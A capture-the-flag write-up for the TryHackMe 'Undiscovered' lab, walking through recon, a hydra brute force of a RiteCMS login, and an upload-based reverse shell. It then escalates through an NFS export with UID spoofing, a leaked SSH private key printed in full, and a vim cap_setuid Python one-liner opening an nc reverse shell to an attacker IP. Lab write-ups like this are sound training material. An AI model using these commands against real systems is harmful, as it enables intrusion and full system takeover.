---
title: Undiscovered - Writeup
---

_**Nov 14, 2020**_

[Undiscovered](https://tryhackme.com/room/undiscoveredup) Writeup

## Recon :

```
bvr0n@kali:~$ nmap -sC -sV -Pn undiscovered.thm
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      36013/tcp6  nlockmgr
|   100021  1,3,4      40919/udp   nlockmgr
|   100021  1,3,4      45172/tcp   nlockmgr
|   100021  1,3,4      45375/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
```

## Virtual Hosts Fuzzing :

```
bvr0n@kali:~$ gobuster vhost -u http://undiscovered.thm/ -w Documents/subdomains-top1million-110000.txt | grep 200
Found: manager.undiscovered.thm (Status: 200) [Size: 4584]
Found: dashboard.undiscovered.thm (Status: 200) [Size: 4626]
Found: deliver.undiscovered.thm (Status: 200) [Size: 4650]
Found: newsite.undiscovered.thm (Status: 200) [Size: 4584]
Found: develop.undiscovered.thm (Status: 200) [Size: 4584]
Found: network.undiscovered.thm (Status: 200) [Size: 4584]
Found: forms.undiscovered.thm (Status: 200) [Size: 4542]
Found: maintenance.undiscovered.thm (Status: 200) [Size: 4668]
Found: view.undiscovered.thm (Status: 200) [Size: 4521]
Found: mailgate.undiscovered.thm (Status: 200) [Size: 4605]
Found: play.undiscovered.thm (Status: 200) [Size: 4521]
Found: start.undiscovered.thm (Status: 200) [Size: 4542]
Found: booking.undiscovered.thm (Status: 200) [Size: 4599]
Found: terminal.undiscovered.thm (Status: 200) [Size: 4605]
Found: gold.undiscovered.thm (Status: 200) [Size: 4521]
Found: internet.undiscovered.thm (Status: 200) [Size: 4605]
Found: resources.undiscovered.thm (Status: 200) [Size: 4626]
Found: 2009.undiscovered.thm (Status: 302) [Size: 294]
Found: 2008.undiscovered.thm (Status: 302) [Size: 294]
Found: WINDOWS2008R2.undiscovered.thm (Status: 302) [Size: 303]
Found: s200.undiscovered.thm (Status: 302) [Size: 294]
Found: web18200.undiscovered.thm (Status: 302) [Size: 298]
```

Enumrating all of them, we discover that `deliver.undiscovered.thm` is our way in .

Going to the website we can see that it running `RiteCMS 2.2.1` , Let's check it for vulnerabilities :

```
bvr0n@kali:~$ searchsploit RiteCMS
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
RiteCMS 1.0.0 - Multiple Vulnerabilities                                                                                           | php/webapps/27315.txt
RiteCMS 2.2.1 - Authenticated Remote Code Execution                                                                                | php/webapps/48636.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

One came up but we need to be authenticated, as the PoC said, the path for authenticating is `/cms/` so let's brute force it :

```
bvr0n@kali:~/CTF/THM/Undiscovered$ hydra -l admin -P ~/Documents/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/:username=^USER^&userpw=^PASS^&LOGIN=log in:login_failed"
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/:username=^USER^&userpw=^PASS^&LOGIN=log in:login_failed
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: *********
```

And we successfully brute forced the admin login :

Go to `Administration > File Manager > Upload File`. And upload a reverse shell , set up a listner and execute it :

## Privilege Escalation :

##### User William :

```
bvr0n@kali:~/Documents/Reverse_Shells$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [IP] from (UNKNOWN) [10.10.70.43] 59970
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's check of shared files :

```
www-data@undiscovered:/home$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william   *(rw,root_squash)
```

we can mount `/home/william` and see what's inside :

```
bvr0n@kali:/mnt$ sudo mount -t nfs 10.10.184.214:/home/william /mnt/ewf/
```

Apparently we need to have the same user and the same UID as william to access this folder, so i created a user locally with the same UID :

```
bvr0n@kali:/mnt$ sudo useradd william -u 3003
```

Since we have access to his folder we can create a ssh key and ssh with it :

```
bvr0n@kali:~/CTF/THM/Undiscovered$ ssh-keygen -f william
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in william
Your public key has been saved in william.pub
The key fingerprint is:
SHA256:1ril+b+qFrnca6CbyVRH9cxhrdG5Yq6fpfp7qZ3n1fU
```

```
william@kali:/mnt/ewf$ mkdir .ssh
william@kali:/mnt/ewf$ cat /home/bvr0n/CTF/THM/Undiscovered/william.pub > .ssh/authorized_keys
```
```
bvr0n@kali:~/CTF/THM/Undiscovered$ ssh -i william william@10.10.18.161
The authenticity of host '10.10.18.161 (10.10.18.161)' can't be established.
ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.18.161' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$
```
##### User Leonard :

After playing around with this script i noticed that it reads files from `/home/leonard/` :

```
william@undiscovered:~$ ./script user.txt 
/bin/cat: /home/leonard/user.txt: No such file or directory
william@undiscovered:~$ ./script id_rsa
/bin/cat: /home/leonard/id_rsa: No such file or directory
```

So we can read a private ssh key :

```
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```

```
william@undiscovered:~$ nano id_rsa
william@undiscovered:~$ chmod 600 id_rsa 
william@undiscovered:~$ ssh -i id_rsa leonard@localhost 
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$
```

##### Root : 

I ran linpeas in it turns out that `vim.basic` had a setuid capability :

```
Files with capabilities:
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```

After trying all the commands i could find, nothing works until i checked `.viminfo` and spotted something weird :

```
leonard@undiscovered:~$ cat .viminfo

-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```
So it's a reverse shell, let's give it a try :

```
leonard@undiscovered:~$ vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f")'
```
Listen for the connection :

```
bvr0n@kali:~$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [IP] from (UNKNOWN) [10.10.184.214] 44858
root@undiscovered:~# id && whoami && hostna
id && whoami && hostname
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
root
undiscovered
root@undiscovered:~#
```

###### Congratulation you now own the system, Thanks for reading my writeup hope you enjoyed it :)

